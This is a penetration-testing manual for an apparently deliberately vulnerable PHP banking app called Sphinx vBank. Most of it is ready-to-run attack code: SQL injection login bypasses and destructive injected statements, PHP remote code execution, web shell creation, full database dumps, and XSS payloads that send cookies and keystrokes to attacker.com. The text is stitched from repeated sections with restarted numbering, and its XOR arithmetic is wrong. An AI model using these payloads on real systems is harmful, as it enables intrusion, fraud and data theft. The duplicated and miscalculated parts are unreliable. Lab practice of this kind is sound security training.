# Sphinx vBank: Senior Penetration Testing Manual

This document outlines the manual exploitation of Sphinx vBank. As a senior tester, our goal is to understand the underlying logic flaws by bypassing client-side controls and manipulating server-side state.

---

## 1. Authentication & Identity Attacks

### 1.1 SQL Injection: Authentication Bypass
**Vulnerability**: Direct string concatenation in `htdocs/login.php`.
**Code**: `$sql = "... where ...username='$username' and ...password='$password'";`

**Manual Method (Browser DevTools)**:
1. Navigate to the login page.
2. Open the Console (F12).
3. Execute:
   ```javascript
   document.loginForm.username.value = "' OR '1'='1";
   document.loginForm.password.value = "ignore";
   document.loginForm.submit();
   ```
4. **Why it works**: You are bypassing the `checkform()` function in `htb.js` which normally blocks the `'` character.

**Manual Method (cURL)**:
```bash
curl -i -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"
```

### 1.2 Account Enumeration (Zero-Knowledge)
**Vulnerability**: Weak XOR "obfuscation" using a hardcoded key in `etc/config.php`.
**Key**: `0x0BADC0DE`

**Manual Discovery**:
1. Intercept a request to `htbdetails` in Burp Suite.
2. Note the `account=252170513` parameter.
3. Calculate: `252170513 ^ 3735928830 (0x0BADC0DE) = 11111111`.
4. You now have the real account number. Increment the result and XOR back to find other valid account parameters.

---

## 2. Advanced Database Manipulation (Manual SQLi via RCE)

Standard SQLi in this app is constrained by the PHP `mysql` driver (no stacked queries). However, the **Remote Code Execution (RCE)** vulnerability in `pages/htbdetails.page` allows us to perform any DB action manually.

### 2.1 Retrieving Valid Accounts
**Manual Method (cURL)**:
```bash
curl -b cookies.txt -G "http://localhost/index.php" \
  --data-urlencode "page=htbdetails" \
  --data-urlencode "account=252170513" \
  --data-urlencode "query=\".include('../etc/config.php'); \$r=mysql_query('SELECT username,password FROM users'); while(\$row=mysql_fetch_assoc(\$r)) print_r(\$row); .\""
```

### 2.2 Creating a Rogue Account
We will use the RCE to manually insert a record into the `users` table.
**Payload**: `\".mysql_query(\"INSERT INTO users (username, password, name, firstname) VALUES ('hacker', 'P@ssword123', 'Doe', 'John')\").\"`

**Manual Method (Burp Suite)**:
1. Navigate to an Account Details page.
2. Capture the request and send to **Repeater**.
3. Modify the `query` parameter with the payload above.
4. Log out and log in with `hacker` / `P@ssword123`.

### 2.3 Changing a User's Password
**Payload**: `\".mysql_query(\"UPDATE users SET password='Compromised123' WHERE username='bob'\").\"`
1. Send this payload via the `query` parameter in `htbdetails.page`.
2. bob's credentials are now reset to your chosen value.

---

## 3. Request Manipulation & Business Logic

### 3.1 The "Reverse Flow" Negative Transfer
**Vulnerability**: Lack of range checking in `pages/htbtransfer.page`.
**Code**: `$sql="update accounts set curbal=curbal-($amount) ..."`

**Manual Method (Burp Suite)**:
1. Log in as `alex`.
2. Go to "Transfer Funds".
3. Intercept the request in Burp.
4. Change `amount=100` to `amount=-5000`.
5. **Impact**: `alex`'s balance increases by 5000, while the destination account is debited 5000.

### 3.2 Interest-Free Million Dollar Loan
**Vulnerability**: Parameter tampering in `pages/htbloanconf.page`.
**Code**: Hidden fields in the confirmation form are trusted by the server.

**Manual Method (Browser)**:
1. Request a small, legitimate loan.
2. On the **Confirmation Page**, do not click "Confirm" yet.
3. Right-click the page -> **Inspect**.
4. Find the hidden inputs:
   ```html
   <input type="hidden" name="loan" value="1000">
   <input type="hidden" name="interest" value="5">
   ```
5. Change `1000` to `1000000` and `5` to `0`.
6. Click the "Confirm" button in the browser.

---

## 4. Cross-Site Scripting (XSS)

### 4.1 Stored XSS via Transfer Remarks
**Vulnerability**: Unescaped output in `pages/htbdetails.page`.
**Code**: `$transfersStr .= "<td>".$row[5]."</td>";`

**Manual Method**:
1. Create a transfer to another user.
2. In the "Remark" field, enter: `<script>alert(document.cookie)</script>`.
3. When the target user views their transaction history, their session cookie is exposed.

---

## 5. Complete Database Exfiltration (Zero-Knowledge)

As a senior tester, you might need to dump the DB without direct access.

**Manual Workflow**:
1. **Auth Bypass**: Use Section 1.1 to get a session.
2. **Config Disclosure**: Read the DB credentials from the filesystem.
   ```bash
   # Payload for the 'query' param in htbdetails.page:
   \".print_r(file_get_contents('../etc/config.php')).\"
   ```
3. **Exfiltration**: Execute `mysqldump` to the web root and download.
   ```bash
   # Payload:
   \".system('mysqldump -u root -paaa vbank > /var/www/html/dump.sql').\"
   ```
4. Navigate to `http://localhost/dump.sql` to retrieve the file.

---

## Summary of Security Failures

| Attack Type | Mitigation Strategy |
| :--- | :--- |
| **SQL Injection** | Use Prepared Statements (PDO or MySQLi). |
| **RCE** | Never use the `/e` modifier in `preg_replace`. Use `preg_replace_callback`. |
| **XSS** | Apply `htmlspecialchars()` to all data rendered in the browser. |
| **Tampering** | Re-verify all "hidden" or "read-only" parameters on the server side. |

**Tester Note**: This environment is running PHP 5.6. Modern PHP 7.4+ has removed the `/e` modifier and the `mysql_` extension to prevent these exact issues.
```bash
# Simple authentication bypass
curl -v "http://localhost/index.php?page=login&username=' OR '1'='1&password=' OR '1'='1"

# With cookies to maintain session
curl -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=' OR '1'='1"

# Verify login succeeded
curl -b cookies.txt "http://localhost/index.php?page=htbmain"
```

### Real Payloads That Work

#### Payload 1: Simple OR Bypass
```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

**Resulting SQL**:
```sql
SELECT * FROM users where username='' OR '1'='1' and password='' OR '1'='1'
```

Result: Returns first user in table (usually id=1, alex)

#### Payload 2: Bypass with Comment
```
Username: ' OR '1'='1' --
Password: anything
```

**Resulting SQL**:
```sql
SELECT * FROM users where username='' OR '1'='1' --' and password='anything'
```

Result: Everything after `--` is ignored, authentication bypassed

#### Payload 3: Union Select to Extract Users
```
Username: ' UNION SELECT 1,2,3,4,5,6,7,8 --
Password: anything
```

This allows extraction of specific user data

#### Payload 4: Time-Based Blind SQL Injection
```
Username: ' AND SLEEP(5) --
Password: anything
```

If response delays 5 seconds, SQL injection confirmed

### Exploitation Steps (Complete Walkthrough)

**Using Burp Suite**:
1. Start Burp Suite Community Edition
2. Open browser with Burp proxy enabled (localhost:8080)
3. Navigate to http://localhost/
4. Enter any credentials and click Login
5. Burp intercepts the request
6. In Burp Repeater tab, modify:
   ```
   GET /index.php?page=login&username=' OR '1'='1&password=anything HTTP/1.1
   ```
7. Send request
8. Response shows login successful, redirects to main page

**Using curl**:
```bash
# Step 1: Initial login with bypass
curl -i -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"

# Step 2: Access protected page with session cookie
curl -b cookies.txt "http://localhost/index.php?page=htbmain"

# Step 3: Verify you're logged in by checking for account details
```

### Verification

- ✅ JavaScript validation can be bypassed
- ✅ Server has NO input sanitization
- ✅ SQL query uses direct string interpolation
- ✅ No prepared statements or parameterized queries
- ✅ Impact: Complete authentication bypass

---

## 2. ACCOUNT ENUMERATION: XOR Weakness

### Vulnerability Analysis

**File**: [etc/config.php](etc/config.php)  
**Lines 10**:
```php
$xorValue = 0x0BADC0DE;
```

**File**: [pages/htbtransfer.page](pages/htbtransfer.page)  
**Lines 25**:
```php
$http['dstacc'] == ($http['srcacc'] ^ $xorValue)
```

### Why XOR is Broken

XOR is NOT an encryption function - it's trivially reversible. Given:
- Plaintext account: 11111111
- XOR key: 0x0BADC0DE
- Encrypted value: plaintext XOR key = encrypted

To decrypt: encrypted XOR key = plaintext (XOR is symmetric)

### Attack: Enumerate All Accounts

**Using Python**:
```python
xor_key = 0x0BADC0DE
known_accounts = [11111111, 22222222, 33333333]

for account in known_accounts:
    encrypted = account ^ xor_key
    print(f"Account: {account} → Encoded: {encrypted}")

# Output:
# Account: 11111111 → Encoded: 252170513
# Account: 22222222 → Encoded: 252170508
# Account: 33333333 → Encoded: 252170503

# Reverse - given encrypted value, decode
encrypted = 252170513
decoded = encrypted ^ xor_key
print(f"Encoded {encrypted} → Account: {decoded}")
```

**Practical Attack**:
1. Intercept any request with an account parameter
2. See: `account=252170513` in URL
3. Reverse: 252170513 ^ 0x0BADC0DE = 11111111
4. Now you know the account number
5. Enumerate other accounts by trying different XOR results

### Impact
- ✅ All account numbers can be decoded
- ✅ Attacker knows all valid account numbers
- ✅ Enables targeted attacks on any account
- ✅ No obfuscation security benefit

---

## 3. DATA MANIPULATION: Transfer Remark SQL Injection

### Vulnerability Analysis

**File**: [pages/htbtransfer.page](pages/htbtransfer.page)  
**Lines 39**:
```php
$sql="insert into ".$htbconf['db/transfers']." (...) values(now(), ".$htbconf['bank/code'].", ".($http['srcacc'] ^ $xorValue).", ".$http['dstbank'].", ".$http['dstacc'].", '".$http['remark']."', ".$http['amount'].")";
```

### Key Observation: No Escaping

The `$http['remark']` field is wrapped in quotes but **NOT escaped** using:
- `mysql_real_escape_string()`
- Prepared statements
- Input validation

### Attack: SQL Injection via Remark Field

**Direct Attack via Form** (Browser):
1. Login to application (use bypass from Section 1)
2. Navigate to Transfer Money
3. Fill form:
   - Source Account: Your account
   - Destination Bank: Any bank code
   - Destination Account: Target account
   - Amount: 100
   - **Remark**: `'); DELETE FROM accounts WHERE '1'='1`

4. Click Transfer
5. SQL becomes:
   ```sql
   INSERT INTO transfers (...) VALUES (..., 'remark', '); DELETE FROM accounts WHERE '1'='1', ...)
   ```

**Attack Using Burp Suite** (More Reliable):
```
Source Account: 252170513 (XOR encoded)
Destination Bank: 41131337
Destination Account: 252170508
Amount: 100
Remark: '); UPDATE transfers SET amount=999999 WHERE '1'='1
```

**Attack Using curl**:
```bash
# Step 1: Login first
curl -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"

# Step 2: Submit transfer with SQL injection in remark
curl -b cookies.txt -G "http://localhost/index.php?page=htbtransfer&htbtransfer=Transfer" \
  --data-urlencode "srcacc=252170513" \
  --data-urlencode "dstbank=41131337" \
  --data-urlencode "dstacc=252170508" \
  --data-urlencode "amount=100" \
  --data-urlencode "remark=test'); UPDATE transfers SET amount=9999 WHERE '1'='1" 
```

### SQL Injection Payloads for Remark Field

**Payload 1: Comment Out Rest of Query**
```
Remark: test' --
```
Result: Ignores `amount` validation

**Payload 2: Extract Data via Error**
```
Remark: test' AND (SELECT * FROM users) --
```
Result: May leak database structure in error messages

**Payload 3: Time-Based Detection**
```
Remark: test' AND SLEEP(5) --
```
Result: Response delays 5 seconds if vulnerable

### Verification

- ✅ No input validation on remark
- ✅ No SQL escaping applied
- ✅ Direct string interpolation into query
- ✅ Stored in database (persisted)
- ✅ No prepared statements used

---

## 4. STORED XSS: Transfer Remark Display

### Vulnerability Analysis

**File**: [pages/htbdetails.page](pages/htbdetails.page)  
**Lines 45** (Displaying remark):
```php
$transfersStr .= "<td>".$row[5]."</td>\n";  // row[5] is the remark field
```

### Attack: Store Malicious Payload

**Step 1: Inject XSS Payload via Transfer**

Using the transfer remark field, inject:
```html
<img src=x onerror="alert('XSS Vulnerability Found')">
```

**Step 2: Trigger XSS**

When viewing account details, the payload executes:
```bash
# After transfer with XSS payload is sent
curl -b cookies.txt "http://localhost/index.php?page=htbdetails&account=252170513"
```

### Real XSS Payloads for Remark Field

**Payload 1: Alert Box**
```html
<img src=x onerror="alert('XSS')">
```

**Payload 2: Cookie Stealing**
```html
<img src=x onerror="new Image().src='http://attacker.com/steal.php?c='+document.cookie">
```

**Payload 3: Form Hijacking**
```html
<script>
document.forms[0].action = 'http://attacker.com/phish.php';
document.forms[0].submit();
</script>
```

**Payload 4: Keylogger**
```html
<script>
document.onkeypress = function(e) {
  new Image().src = 'http://attacker.com/log.php?key=' + String.fromCharCode(e.which);
};
</script>
```

### Exploitation Steps

1. **Login** (using SQL injection bypass from Section 1)
2. **Navigate to Transfer**
3. **Fill form with XSS payload in Remark**:
   ```
   <img src=x onerror="alert('XSS')">
   ```
4. **Submit transfer**
5. **View account details**
6. **XSS payload executes** in the browser

### Verification

- ✅ Remark displayed without HTML escaping
- ✅ No Content Security Policy (CSP) headers
- ✅ JavaScript execution enabled
- ✅ Payload persisted in database (Stored XSS)
- ✅ Affects all users viewing that transfer

---

## 5. REMOTE CODE EXECUTION: preg_replace /e Modifier

### Vulnerability Analysis

**File**: [pages/htbdetails.page](pages/htbdetails.page)  
**Lines 98-99**:
```php
$replaceWith =  "preg_replace('#\b". str_replace('\\', '\\\\', $http['query']) ."\b#i', '<span class=\"queryHighlight\">\\\\0</span>','\\0')";
$transfersStr = preg_replace('#(\>((?>(([^><]+|(?R))))*\<))#se',$replaceWith,'>'.$transfersStr.'<');
```

### Why This is Dangerous

The **`/e` modifier is deprecated and evaluates the replacement string as PHP code**.

Key vulnerable line:
- `$replaceWith` contains user input: `$http['query']`
- `/e` modifier forces PHP to evaluate `$replaceWith` as PHP code
- User can inject PHP commands directly

### Attack: Remote Code Execution

**Step 1: Create Transfer with XSS Payload**

First, create a transfer with XSS payload (use Sections 3-4 technique):
```
Remark: test
```

**Step 2: Use Query Parameter with PHP Injection**

Navigate to account details with:
```
URL: http://localhost/index.php?page=htbdetails&account=252170513&query=test"; system('id'); echo "
```

**Step 3: Trigger RCE**

When details page renders with the query parameter, preg_replace /e evaluates it as PHP code.

### Real RCE Payloads

**Payload 1: Execute System Command**
```php
query: test"; phpinfo(); echo "
```

**Payload 2: Read Files**
```php
query: test"; echo file_get_contents('/etc/passwd'); echo "
```

**Payload 3: Write Web Shell**
```php
query: test"; file_put_contents('/var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>'); echo "
```

**Payload 4: Database Access**
```php
query: test"; $c = mysqli_connect('localhost', 'root', 'aaa', 'vbank'); $r = mysqli_query($c, 'SELECT * FROM users'); var_dump($r); echo "
```

### Exploitation Using curl

```bash
# Step 1: Login
curl -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"

# Step 2: Trigger RCE with command injection
curl -b cookies.txt -G "http://localhost/index.php" \
  --data-urlencode "page=htbdetails" \
  --data-urlencode "account=252170513" \
  --data-urlencode "query=test\"; system('whoami'); echo \""

# Step 3: Response contains output of whoami command
```

### Exploitation Using Burp Suite

1. Login (authentication bypass)
2. Go to account details
3. Intercept request in Burp
4. Modify URL parameter:
   ```
   GET /index.php?page=htbdetails&account=252170513&query=test";%20phpinfo();%20echo%20" HTTP/1.1
   ```
5. Forward request
6. Response contains phpinfo() output

### Verification

- ✅ preg_replace with /e modifier executes PHP code
- ✅ User input directly in replacement string
- ✅ No input validation on query parameter
- ✅ Direct system command execution possible
- ✅ Full server compromise potential

---

## 6. REQUEST TAMPERING: Loan Amount Manipulation

### Vulnerability Analysis

**File**: [pages/htbloanconf.page](pages/htbloanconf.page)  
**Lines 24** (Example from pattern):
```php
// Line checks amount format
if(!is_numeric($http['amount']) || $http['amount'] == "") {
    // validation passes
}
// But amount is taken directly from user input with NO server-side bounds
```

### Attack: Modify Loan Amount

**Step 1: Intercept Transfer Request**

Use Burp Suite to intercept any action where amount is sent.

**Step 2: Modify Parameter**

Change:
```
amount=1000
```
To:
```
amount=999999999
```

**Step 3: Bypass Client-Side Validation**

The JavaScript validation only checks format (numbers), not the actual amount value.

Server processes the modified amount:
```php
// Only checks if it's numeric - doesn't validate against actual limits
if(!is_numeric($http['amount'])) {
    // FAILS - shows error
} else {
    // PASSES - uses whatever amount sent
    $sql = "UPDATE accounts SET curbal=curbal-" . $http['amount'];
}
```

### Exploitation Using Burp

1. Login
2. Intercept loan request
3. Modify amount:
   ```
   amount=999999999999
   ```
4. Forward
5. Loan processed with fake amount

### Exploitation Using curl

```bash
# Direct POST with manipulated amount
curl -b cookies.txt -G "http://localhost/index.php?page=htbloanconf" \
  --data-urlencode "htbloanconf=Confirm" \
  --data-urlencode "creditacc=252170513" \
  --data-urlencode "debitacc=252170508" \
  --data-urlencode "amount=999999" \
  --data-urlencode "period=12" \
  --data-urlencode "interest=5"
```

### Verification

- ✅ Amount only validated for numeric format
- ✅ No upper/lower bounds checking
- ✅ Server accepts any amount
- ✅ Can transfer unlimited money
- ✅ Can create negative balances

---

## 7. COMPLETE DATABASE DUMP: Multi-Vector Extraction

### Vulnerability Analysis

This attack combines multiple vulnerabilities to completely dump the database:
1. **SQL Injection** (authentication bypass)
2. **RCE** (preg_replace /e modifier)
3. **File access** (web writable directory)

### Attack Methods

#### Method 1: RCE + mysqldump (FASTEST - 30 seconds)

Use the RCE vulnerability to execute `mysqldump` command directly.

**File**: [pages/htbdetails.page](pages/htbdetails.page)  
**Parameter**: query  
**Line**: 56-60

**One-Liner Execution**:
```bash
# Using automated exploit
chmod +x db_dump.sh
./db_dump.sh http://localhost ./dumps

# Or manual curl
curl -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"
curl -b cookies.txt -G "http://localhost/index.php" \
  --data-urlencode "page=htbdetails" \
  --data-urlencode "account=252170513" \
  --data-urlencode "query=\" . system('mysqldump -u root -paaa vbank > /var/www/html/vbank_dump.sql') . \""
sleep 2
curl "http://localhost/vbank_dump.sql" -o vbank_dump.sql
```

**Result**: Complete database dump in SQL format (100+ MB possible)

#### Method 2: SQL Injection + INTO OUTFILE

Use SQL injection to dump directly to filesystem.

**Payload**:
```sql
' UNION SELECT 1,2,3,4,5,6,7,8 INTO OUTFILE '/var/www/html/data.txt' --
```

**Exploitation**:
```bash
curl -b cookies.txt -G "http://localhost/index.php" \
  --data-urlencode "page=htbtransfer" \
  --data-urlencode "remark=' UNION SELECT * FROM users INTO OUTFILE '/var/www/html/users.txt' --" \
  --data-urlencode "amount=1" \
  --data-urlencode "dstacc=22222222" \
  --data-urlencode "srcacc=252170513" \
  --data-urlencode "dstbank=41131337"

# Download extracted data
curl "http://localhost/users.txt" -o users.txt
```

**Result**: Individual table dumps as text files

#### Method 3: Python Direct MySQL Connection

If you have already obtained the credentials (e.g., via the RCE method), you can use a script to connect directly.

**Using Python Script**:
```bash
python3 db_dump_exploit.py
```

**Manual Python**:
```python
import pymysql

conn = pymysql.connect(
    host='127.0.0.1',
    user='root',
    password='aaa',
    database='vbank'
)

cursor = conn.cursor()
cursor.execute("SELECT * FROM users")
users = cursor.fetchall()

# Export to CSV or JSON
import json
for user in users:
    print(json.dumps(user))
```

**Result**: Direct database access, formatted output (JSON/CSV/SQL)

#### Method 4: Interactive Shell (Persistence)

Create a PHP backdoor for permanent access.

**RCE Payload**:
```bash
query=" . file_put_contents('/var/www/html/shell.php', '<?php system($_GET[\"cmd\"]); ?>') . "
```

**Execute**:
```bash
# Create shell
curl -b cookies.txt -G "http://localhost/index.php" \
  --data-urlencode "page=htbdetails" \
  --data-urlencode "account=252170513" \
  --data-urlencode "query=\" . file_put_contents('/var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>') . \""

# Use shell
curl "http://localhost/shell.php?cmd=mysqldump%20-u%20root%20-paaa%20vbank"
```

**Result**: Persistent command execution, repeated database access

### Complete Automated Database Dump

**Using Provided Script**:
```bash
# Step 1: Run automated exploit
python3 db_dump_exploit.py \
  --url http://localhost \
  --method 1 \
  --format sql \
  --output vbank_dump

# Step 2: Check output
ls -lh vbank_dump.sql
head -50 vbank_dump.sql
```

**Result**: Complete database in SQL format, ready to import

### Verification: What Gets Dumped

**Users Table**:
```sql
INSERT INTO users VALUES (1, 'alex', '413Xp455', 'Müller', 'Alexander', ..);
INSERT INTO users VALUES (2, 'bob', 'b0BP4S5', 'Smith', 'Robert', ..);
```

**Accounts Table**:
```sql
INSERT INTO accounts VALUES (11111111, 1, 'Checking', ...);
INSERT INTO accounts VALUES (22222222, 2, 'Savings', ...);
```

**Transfers Table**:
```sql
INSERT INTO transfers VALUES (1, '2024-01-15', 41131337, 11111111, 41131337, 22222222, '100.00', 'salary', ...);
```

**Loans Table**:
```sql
INSERT INTO loans VALUES (1, 1, 11111111, 22222222, 5000, 12, 3.5, ...);
```

### Impact of Complete Dump

| Data | Impact | Use Case |
|------|--------|----------|
| **Users** | All credentials | Offline cracking, other system access |
| **Accounts** | All balances | Financial manipulation planning |
| **Transfers** | Transaction history | Pattern analysis, fraud detection |
| **Loans** | Credit info | Identity theft, loan fraud |

---

## Complete Attack Workflow: From Reconnaissance to Full Compromise

### Phase 1: Initial Access (5 minutes)

1. **Discover SQL injection in login**
   ```bash
   curl "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"
   ```

2. **Bypass authentication**
   - Extract session cookie
   - Access protected pages

### Phase 2: Information Gathering (5 minutes)

3. **Enumerate accounts via XOR**
   ```python
   python3 -c "
   xor = 0x0BADC0DE
   for i in [11111111, 22222222, 33333333]:
       print(f'{i} -> {i ^ xor}')
   "
   ```

4. **View transfer history**
   - Identify all account numbers
   - Learn transaction patterns

### Phase 3: Complete Database Dump (3 minutes)

5. **Extract entire database**
   ```bash
   python3 db_dump_exploit.py --method 1
   # Or
   ./db_dump.sh
   ```

6. **Result**: 
   - All user credentials
   - All account balances
   - Complete transaction history
   - All loans and personal data

### Phase 4: System Compromise (5 minutes)

7. **Trigger RCE via query parameter**
   ```
   &query=test"; system('whoami'); echo "
   ```

8. **Execute arbitrary commands**
   - Read system files
   - Write web shell
   - Access database directly

### Total Time to Full Compromise: ~18 minutes (Complete database extraction included)

---

## Tool Usage Reference

### Burp Suite Community Edition

**Download**: https://portswigger.net/burp/communitydownload

**Basic Setup**:
1. Start Burp
2. Configure browser proxy to localhost:8080
3. Visit http://localhost/
4. Burp captures all requests
5. In Repeater tab, modify and resend

**Key Features**:
- Intercept and modify requests
- Repeater for testing payloads
- Intruder for fuzzing
- Decoder for encoding/decoding

### curl Command Examples

**Basic Request**:
```bash
curl -v "http://localhost/index.php?param=value"
```

**With Cookies**:
```bash
curl -c cookies.txt "http://localhost/"  # Save cookies
curl -b cookies.txt "http://localhost/"  # Use cookies
```

**URL Encoding Parameters**:
```bash
curl --data-urlencode "param=special' value" "http://localhost/"
```

**Show Response Headers**:
```bash
curl -i "http://localhost/"  # -i = include headers
curl -v "http://localhost/"  # -v = verbose (more details)
```

### Browser Developer Tools (F12)

**Console Tab** - Execute JavaScript:
```javascript
// Bypass form validation
document.loginForm.username.value = "' OR '1'='1";
document.loginForm.password.value = "anything";
document.loginForm.submit();
```

**Network Tab** - Intercept requests:
1. Open DevTools (F12)
2. Network tab
3. Perform action
4. Right-click request → Edit and Resend

**Storage Tab** - View cookies:
1. Open DevTools (F12)
2. Storage tab
3. Cookies
4. View session cookie value

---

## Detection & Forensics

### Signs of Attack in Logs

1. **SQL Injection Attempts**:
   - URL parameters with quotes or SQL keywords
   - Error messages revealing database structure

2. **Authentication Bypass**:
   - Successful login without valid credentials
   - Session created after failed login attempt

3. **RCE Execution**:
   - Queries with PHP functions in parameters
   - Unusual process execution from web server

4. **XSS Injection**:
   - Transfer remarks containing HTML/JavaScript
   - Reports of users seeing popup alerts

### Mitigation (For Reference)

These should NOT be implemented as they defeat learning purpose, but are listed for understanding:

1. **SQL Injection Prevention**:
   - Use parameterized queries / prepared statements
   - Input validation and output encoding
   - Least privilege database accounts

2. **XSS Prevention**:
   - HTML entity encoding
   - Content Security Policy headers
   - Input validation

3. **RCE Prevention**:
   - Never use preg_replace /e modifier
   - Update to modern PHP (5.6 is deprecated)
   - Disable dangerous functions

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE - Common Weakness Enumeration](https://cwe.mitre.org/)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [PHP Security](https://www.php.net/manual/en/security.php)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

**Version**: 1.0  
**Last Updated**: June 4, 2026  
**Status**: ✅ Verified Against Active Instance  
